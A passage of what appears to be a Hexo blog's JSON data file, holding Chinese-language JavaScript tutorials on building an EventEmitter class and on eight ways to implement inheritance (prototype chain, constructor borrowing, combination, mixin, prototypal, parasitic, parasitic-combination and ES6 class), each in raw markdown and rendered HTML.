class=\"string\">&#x27;input&#x27;</span>, cb)</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;input&#x27;</span>, &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;, &#123;<span class=\"attr\">age</span>: <span class=\"number\">18</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// --- output ---</span></span><br><span class=\"line\"><span class=\"comment\">// 1 ​​​​​</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// test on/off/emit function</span></span><br><span class=\"line\">eventBus.off(<span class=\"string\">&#x27;input&#x27;</span>)</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;input&#x27;</span>, &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;, &#123;<span class=\"attr\">age</span>: <span class=\"number\">18</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// --- output ---</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// test once/emit function</span></span><br><span class=\"line\">eventBus.once(<span class=\"string\">&#x27;change&#x27;</span>, cb)</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;change&#x27;</span>, &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;)</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;change&#x27;</span>, &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// --- output ---</span></span><br><span class=\"line\"><span class=\"comment\">// [ &#123; name: &#x27;jack&#x27; &#125; ] </span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"EventEmitter-实现原理\"><a href=\"#EventEmitter-实现原理\" class=\"headerlink\" title=\"EventEmitter 实现原理\"></a>EventEmitter 实现原理</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">EventEmitter</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events = <span class=\"built_in\">Object</span>.create(<span class=\"literal\">null</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 监听事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">on</span>(<span class=\"params\">eventName, fn</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">this</span>.events[eventName]) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.events[eventName] = []</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events[eventName].push(fn)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 触发事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">emit</span>(<span class=\"params\">eventName, ...args</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">this</span>.events[eventName] || !<span class=\"built_in\">Array</span>.isArray(<span class=\"built_in\">this</span>.events[eventName])) <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events[eventName].map(<span class=\"function\"><span class=\"params\">fn</span> =&gt;</span> &#123;</span><br><span class=\"line\">      fn.apply(<span class=\"built_in\">this</span>, args)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 注销事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">off</span>(<span class=\"params\">eventName, fn</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fn === <span class=\"keyword\">void</span> <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.events[eventName] = <span class=\"literal\">null</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.events[eventName].length) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> index = <span class=\"built_in\">this</span>.events[eventName].findIndex(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> item === fn)</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (index &gt; -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.events[eventName].splice(index, <span class=\"number\">1</span>)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 注册单次执行的事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">once</span>(<span class=\"params\">eventName, fn</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> only = <span class=\"function\">(<span class=\"params\">...args</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      fn.apply(<span class=\"built_in\">this</span>, args)</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.off(eventName)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.on(eventName, only)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// test on/emit function</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> eventBus = <span class=\"keyword\">new</span> EventEmitter()</span><br><span class=\"line\">eventBus.on(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">() =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>))</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;click&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">// --- output ---</span></span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// test on/emit function</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> cb = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">...args</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;2: &#x27;</span>, args)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">eventBus.on(<span class=\"string\">&#x27;input&#x27;</span>, <span class=\"function\">() =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>))</span><br><span class=\"line\">eventBus.on(<span class=\"string\">&#x27;input&#x27;</span>, cb)</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;input&#x27;</span>, &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;, &#123;<span class=\"attr\">age</span>: <span class=\"number\">18</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// --- output ---</span></span><br><span class=\"line\"><span class=\"comment\">// 1 ​​​​​</span></span><br><span class=\"line\"><span class=\"comment\">// 2:  [ &#123; name: &#x27;jack&#x27; &#125;, &#123; age: 18 &#125; ] </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// test on/off/emit function</span></span><br><span class=\"line\">eventBus.off(<span class=\"string\">&#x27;input&#x27;</span>, cb)</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;input&#x27;</span>, &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;, &#123;<span class=\"attr\">age</span>: <span class=\"number\">18</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// --- output ---</span></span><br><span class=\"line\"><span class=\"comment\">// 1 ​​​​​</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// test on/off/emit function</span></span><br><span class=\"line\">eventBus.off(<span class=\"string\">&#x27;input&#x27;</span>)</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;input&#x27;</span>, &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;, &#123;<span class=\"attr\">age</span>: <span class=\"number\">18</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// --- output ---</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// test once/emit function</span></span><br><span class=\"line\">eventBus.once(<span class=\"string\">&#x27;change&#x27;</span>, cb)</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;change&#x27;</span>, &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;)</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;change&#x27;</span>, &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// --- output ---</span></span><br><span class=\"line\"><span class=\"comment\">// [ &#123; name: &#x27;jack&#x27; &#125; ] </span></span><br></pre></td></tr></table></figure>"},{"title":"JS 实现继承的几种方式","date":"2021-03-12T07:32:28.000Z","_content":"\n# JS 实现继承的几种方式\n\n[TOC]\n\n## 1. 原型链继承\n\n```js\nfunction SuperType() {\n  this.property = true;\n}\nSuperType.prototype.getSuperValue = function () {\n  return this.property;\n};\n\nfunction SubType() {\n  this.subproperty = false;\n}\n\n//继承了 SuperType\nSubType.prototype = new SuperType();\nSubType.prototype.constructor = SubType;\nSubType.prototype.getSubValue = function () {\n  return this.subproperty;\n};\n\nvar instance = new SubType();\nconsole.log(instance.getSubValue()); // false\nconsole.log(instance.getSuperValue()); // true\n```\n\n**缺点：**\n1. 包含引用类型值的原型属性会被所有实例共享，原型链上的属性为引用类型时，某个实例修改原型链上的属性会导致其他实例也会受到影响\n2. 在创建子类型的实例时，不能向超类型的构造函数中传递参数\n\n## 2. 借用构造函数继承\n\n```js\nfunction SuperType(){\n this.colors = [\"red\", \"blue\", \"green\"];\n}\nfunction SubType(){\n //继承了 SuperType\n SuperType.call(this);\n}\n\nvar instance1 = new SubType();\ninstance1.colors.push(\"black\");\nconsole.log(instance1.colors); //\"red,blue,green,black\"\n\nvar instance2 = new SubType();\nconsole.log(instance2.colors); //\"red,blue,green\" \n```\n\n**缺点：**\n1. 无法复用函数，因为方法都在构造函数中定义（没有通过原型链引用）\n2. 在超类型的原型中定义的方法，对子类型而言也是不可见的，结果所有类型都只能使用构造函数模式\n\n## 3. 原型链 + 借用构造函数继承\n\n```js\nfunction SuperType(name){\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n }\n SuperType.prototype.sayName = function(){\n  console.log(this.name);\n };\n\n function SubType(name, age){\n  //继承属性\n  SuperType.call(this, name);\n  this.age = age;\n }\n //继承方法\n SubType.prototype = new SuperType();\n SubType.prototype.constructor = SubType;\n SubType.prototype.sayAge = function(){\n  console.log(this.age);\n };\n\n var instance1 = new SubType(\"Nicholas\", 29);\n instance1.colors.push(\"black\");\n console.log(instance1.colors); //\"red,blue,green,black\"\n instance1.sayName(); //\"Nicholas\";\n instance1.sayAge(); //29\n \n var instance2 = new SubType(\"Greg\", 27);\n console.log(instance2.colors); //\"red,blue,green\"\n instance2.sayName(); //\"Greg\n```\n\n说明：组合继承避免了原型链和借用构造函数的缺陷，融合了它们的优点，成为 JavaScript 中最常用的继承模式\n\n缺点：\n1. 会调用两次超类型构造函数\n\n## 4. 混入式继承\n\n```js\nfunction MyClass() {\n  SuperClass.call(this);\n  OtherSuperClass.call(this);\n}\n\n// 继承一个类\nMyClass.prototype = Object.create(SuperClass.prototype);\n// 混合其它\nObject.assign(MyClass.prototype, OtherSuperClass.prototype);\n// 重新指定constructor\nMyClass.prototype.constructor = MyClass;\n\nMyClass.prototype.myMethod = function() {\n  // do something\n};\n```\n\n## 5. 原型式继承\n**原型式继承**适用于一个对象继承自另一个对象的情况，可以不必引入构造函数\n\nECMAScript5 通过新增 Object.create()方法规范化了**原型式继承**。这个方法接收两个参数：一个用作新对象原型的对象和（可选的）一个为新对象定义额外属性的对象\n\n```js\nvar person = {\n name: \"Nicholas\",\n friends: [\"Shelby\", \"Court\", \"Van\"]\n};\n\nvar anotherPerson = Object.create(person);\nanotherPerson.name = \"Greg\";\nanotherPerson.friends.push(\"Rob\");\n\nvar yetAnotherPerson = Object.create(person);\nyetAnotherPerson.name = \"Linda\";\nyetAnotherPerson.friends.push(\"Barbie\");\nalert(person.friends); // \"Shelby,Court,Van,Rob,Barbie\" \n\n// 模拟 Object.create() 方法\nObject.$create = function(original) {\n  var fn = function() {};\n  fn.prototype = original;\n  return new fn();\n}\n```\n\n> 在没有必要兴师动众地创建构造函数，而只想让一个对象与另一个对象保持类似的情况下，原型式继承是完全可以胜任的，不过别忘了，包含引用类型值的属性始终都会共享相应的值，就像使用原型模式一样\n\n## 6. 寄生式继承\n\n**寄生式继承**是结合了原型式继承和工厂模式的一种方式，即创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象，最后再像真地是它做了所有工作一样返回对象。适用于通过函数返回一个增强了的对象。\n\n```js\nfunction createAnother(original) {\n  var clone = Object.create(original); // 通过调用函数创建一个新对象\n  clone.sayHi = function () {  //以某种方式来增强这个对象\n    console.log(\"hi\");\n  };\n  return clone; //返回这个对象\n}\n\nvar person = {\n  name: \"Nicholas\",\n  friends: [\"Shelby\", \"Court\", \"Van\"],\n};\nvar anotherPerson = createAnother(person);\nanotherPerson.sayHi(); //\"hi\"\n```\n\n缺点：\n1. 需要在构造函数中给每个对象添加函数，导致不能复用函数\n\n## 7. 寄生 + 原型链继承\n\n**寄生 + 原型链是引用类型最理想的继承范式**\n\n```js\nfunction inheritPrototype(subType, superType) {\n  var prototype = Object.create(superType.prototype); //创建对象\n  prototype.constructor = subType; //增强对象\n  subType.prototype = prototype; //指定对象\n}\n\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function () {\n  console.log(this.name);\n};\n\nfunction SubType(name, age) {\n  SuperType.call(this, name);\n  this.age = age;\n}\n\ninheritPrototype(SubType, SuperType);\n\nSubType.prototype.sayAge = function () {\n  console.log(this.age);\n};\n```\n\n## 8. Class 继承\n\n```js\nclass Parent {\n  constructor(name) {\n    this.name = name;\n  }\n  static sayHello() {\n    console.log(\"hello\");\n  }\n  sayName() {\n    console.log(\"my name is \" + this.name);\n    return this.name;\n  }\n}\nclass Child extends Parent {\n  constructor(name, age) {\n    super(name);\n    this.age = age;\n  }\n  sayAge() {\n    console.log(\"my age is \" + this.age);\n    return this.age;\n  }\n}\n\nlet parent = new Parent(\"Parent\");\nlet child = new Child(\"Child\", 18);\n\nconsole.log(\"parent: \", parent); // parent:  Parent {name: \"Parent\"}\nParent.sayHello(); // hello\nparent.sayName(); // my name is Parent\nconsole.log(\"child: \", child); // child:  Child {name: \"Child\", age: 18}\nChild.sayHello(); // hello\nchild.sayName(); // my name is Child\nchild.sayAge(); // my age is 18\n\n// 1、构造器原型链\nChild.__proto__ === Parent; // true\nParent.__proto__ === Function.prototype; // true\nFunction.prototype.__proto__ === Object.prototype; // true\nObject.prototype.__proto__ === null; // true\n// 2、实例原型链\nchild.__proto__ === Child.prototype; // true\nChild.prototype.__proto__ === Parent.prototype; // true\nParent.prototype.__proto__ === Object.prototype; // true\nObject.prototype.__proto__ === null; // true\n\n```","source":"_posts/JavaScript 编程题/JS 实现继承的几种方式.md","raw":"---\ntitle: JS 实现继承的几种方式\ncategories: JavaScript 编程题\ntags: [编程题]\ndate: 2021-03-12 15:32:28\n---\n\n# JS 实现继承的几种方式\n\n[TOC]\n\n## 1. 原型链继承\n\n```js\nfunction SuperType() {\n  this.property = true;\n}\nSuperType.prototype.getSuperValue = function () {\n  return this.property;\n};\n\nfunction SubType() {\n  this.subproperty = false;\n}\n\n//继承了 SuperType\nSubType.prototype = new SuperType();\nSubType.prototype.constructor = SubType;\nSubType.prototype.getSubValue = function () {\n  return this.subproperty;\n};\n\nvar instance = new SubType();\nconsole.log(instance.getSubValue()); // false\nconsole.log(instance.getSuperValue()); // true\n```\n\n**缺点：**\n1. 包含引用类型值的原型属性会被所有实例共享，原型链上的属性为引用类型时，某个实例修改原型链上的属性会导致其他实例也会受到影响\n2. 在创建子类型的实例时，不能向超类型的构造函数中传递参数\n\n## 2. 借用构造函数继承\n\n```js\nfunction SuperType(){\n this.colors = [\"red\", \"blue\", \"green\"];\n}\nfunction SubType(){\n //继承了 SuperType\n SuperType.call(this);\n}\n\nvar instance1 = new SubType();\ninstance1.colors.push(\"black\");\nconsole.log(instance1.colors); //\"red,blue,green,black\"\n\nvar instance2 = new SubType();\nconsole.log(instance2.colors); //\"red,blue,green\" \n```\n\n**缺点：**\n1. 无法复用函数，因为方法都在构造函数中定义（没有通过原型链引用）\n2. 在超类型的原型中定义的方法，对子类型而言也是不可见的，结果所有类型都只能使用构造函数模式\n\n## 3. 原型链 + 借用构造函数继承\n\n```js\nfunction SuperType(name){\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n }\n SuperType.prototype.sayName = function(){\n  console.log(this.name);\n };\n\n function SubType(name, age){\n  //继承属性\n  SuperType.call(this, name);\n  this.age = age;\n }\n //继承方法\n SubType.prototype = new SuperType();\n SubType.prototype.constructor = SubType;\n SubType.prototype.sayAge = function(){\n  console.log(this.age);\n };\n\n var instance1 = new SubType(\"Nicholas\", 29);\n instance1.colors.push(\"black\");\n console.log(instance1.colors); //\"red,blue,green,black\"\n instance1.sayName(); //\"Nicholas\";\n instance1.sayAge(); //29\n \n var instance2 = new SubType(\"Greg\", 27);\n console.log(instance2.colors); //\"red,blue,green\"\n instance2.sayName(); //\"Greg\n```\n\n说明：组合继承避免了原型链和借用构造函数的缺陷，融合了它们的优点，成为 JavaScript 中最常用的继承模式\n\n缺点：\n1. 会调用两次超类型构造函数\n\n## 4. 混入式继承\n\n```js\nfunction MyClass() {\n  SuperClass.call(this);\n  OtherSuperClass.call(this);\n}\n\n// 继承一个类\nMyClass.prototype = Object.create(SuperClass.prototype);\n// 混合其它\nObject.assign(MyClass.prototype, OtherSuperClass.prototype);\n// 重新指定constructor\nMyClass.prototype.constructor = MyClass;\n\nMyClass.prototype.myMethod = function() {\n  // do something\n};\n```\n\n## 5. 原型式继承\n**原型式继承**适用于一个对象继承自另一个对象的情况，可以不必引入构造函数\n\nECMAScript5 通过新增 Object.create()方法规范化了**原型式继承**。这个方法接收两个参数：一个用作新对象原型的对象和（可选的）一个为新对象定义额外属性的对象\n\n```js\nvar person = {\n name: \"Nicholas\",\n friends: [\"Shelby\", \"Court\", \"Van\"]\n};\n\nvar anotherPerson = Object.create(person);\nanotherPerson.name = \"Greg\";\nanotherPerson.friends.push(\"Rob\");\n\nvar yetAnotherPerson = Object.create(person);\nyetAnotherPerson.name = \"Linda\";\nyetAnotherPerson.friends.push(\"Barbie\");\nalert(person.friends); // \"Shelby,Court,Van,Rob,Barbie\" \n\n// 模拟 Object.create() 方法\nObject.$create = function(original) {\n  var fn = function() {};\n  fn.prototype = original;\n  return new fn();\n}\n```\n\n> 在没有必要兴师动众地创建构造函数，而只想让一个对象与另一个对象保持类似的情况下，原型式继承是完全可以胜任的，不过别忘了，包含引用类型值的属性始终都会共享相应的值，就像使用原型模式一样\n\n## 6. 寄生式继承\n\n**寄生式继承**是结合了原型式继承和工厂模式的一种方式，即创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象，最后再像真地是它做了所有工作一样返回对象。适用于通过函数返回一个增强了的对象。\n\n```js\nfunction createAnother(original) {\n  var clone = Object.create(original); // 通过调用函数创建一个新对象\n  clone.sayHi = function () {  //以某种方式来增强这个对象\n    console.log(\"hi\");\n  };\n  return clone; //返回这个对象\n}\n\nvar person = {\n  name: \"Nicholas\",\n  friends: [\"Shelby\", \"Court\", \"Van\"],\n};\nvar anotherPerson = createAnother(person);\nanotherPerson.sayHi(); //\"hi\"\n```\n\n缺点：\n1. 需要在构造函数中给每个对象添加函数，导致不能复用函数\n\n## 7. 寄生 + 原型链继承\n\n**寄生 + 原型链是引用类型最理想的继承范式**\n\n```js\nfunction inheritPrototype(subType, superType) {\n  var prototype = Object.create(superType.prototype); //创建对象\n  prototype.constructor = subType; //增强对象\n  subType.prototype = prototype; //指定对象\n}\n\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function () {\n  console.log(this.name);\n};\n\nfunction SubType(name, age) {\n  SuperType.call(this, name);\n  this.age = age;\n}\n\ninheritPrototype(SubType, SuperType);\n\nSubType.prototype.sayAge = function () {\n  console.log(this.age);\n};\n```\n\n## 8. Class 继承\n\n```js\nclass Parent {\n  constructor(name) {\n    this.name = name;\n  }\n  static sayHello() {\n    console.log(\"hello\");\n  }\n  sayName() {\n    console.log(\"my name is \" + this.name);\n    return this.name;\n  }\n}\nclass Child extends Parent {\n  constructor(name, age) {\n    super(name);\n    this.age = age;\n  }\n  sayAge() {\n    console.log(\"my age is \" + this.age);\n    return this.age;\n  }\n}\n\nlet parent = new Parent(\"Parent\");\nlet child = new Child(\"Child\", 18);\n\nconsole.log(\"parent: \", parent); // parent:  Parent {name: \"Parent\"}\nParent.sayHello(); // hello\nparent.sayName(); // my name is Parent\nconsole.log(\"child: \", child); // child:  Child {name: \"Child\", age: 18}\nChild.sayHello(); // hello\nchild.sayName(); // my name is Child\nchild.sayAge(); // my age is 18\n\n// 1、构造器原型链\nChild.__proto__ === Parent; // true\nParent.__proto__ === Function.prototype; // true\nFunction.prototype.__proto__ === Object.prototype; // true\nObject.prototype.__proto__ === null; // true\n// 2、实例原型链\nchild.__proto__ === Child.prototype; // true\nChild.prototype.__proto__ === Parent.prototype; // true\nParent.prototype.__proto__ === Object.prototype; // true\nObject.prototype.__proto__ === null; // true\n\n```","slug":"JavaScript 编程题/JS 实现继承的几种方式","published":1,"updated":"2021-04-30T06:59:25.245Z","_id":"cko3yr62v000kio6rhgje9i38","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"JS-实现继承的几种方式\"><a href=\"#JS-实现继承的几种方式\" class=\"headerlink\" title=\"JS 实现继承的几种方式\"></a>JS 实现继承的几种方式</h1><p>[TOC]</p>\n<h2 id=\"1-原型链继承\"><a href=\"#1-原型链继承\" class=\"headerlink\" title=\"1. 原型链继承\"></a>1. 原型链继承</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.property = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.getSuperValue = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.property;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.subproperty = <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//继承了 SuperType</span></span><br><span class=\"line\">SubType.prototype = <span class=\"keyword\">new</span> SuperType();</span><br><span class=\"line\">SubType.prototype.constructor = SubType;</span><br><span class=\"line\">SubType.prototype.getSubValue = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.subproperty;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance = <span class=\"keyword\">new</span> SubType();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(instance.getSubValue()); <span class=\"comment\">// false</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(instance.getSuperValue()); <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>缺点：</strong></p>\n<ol>\n<li>包含引用类型值的原型属性会被所有实例共享，原型链上的属性为引用类型时，某个实例修改原型链上的属性会导致其他实例也会受到影响</li>\n<li>在创建子类型的实例时，不能向超类型的构造函数中传递参数</li>\n</ol>\n<h2 id=\"2-借用构造函数继承\"><a href=\"#2-借用构造函数继承\" class=\"headerlink\" title=\"2. 借用构造函数继承\"></a>2. 借用构造函数继承</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"> <span class=\"built_in\">this</span>.colors = [<span class=\"string\">&quot;red&quot;</span>, <span class=\"string\">&quot;blue&quot;</span>, <span class=\"string\">&quot;green&quot;</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"> <span class=\"comment\">//继承了 SuperType</span></span><br><span class=\"line\"> SuperType.call(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance1 = <span class=\"keyword\">new</span> SubType();</span><br><span class=\"line\">instance1.colors.push(<span class=\"string\">&quot;black&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(instance1.colors); <span class=\"comment\">//&quot;red,blue,green,black&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance2 = <span class=\"keyword\">new</span> SubType();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(instance2.colors); <span class=\"comment\">//&quot;red,blue,green&quot; 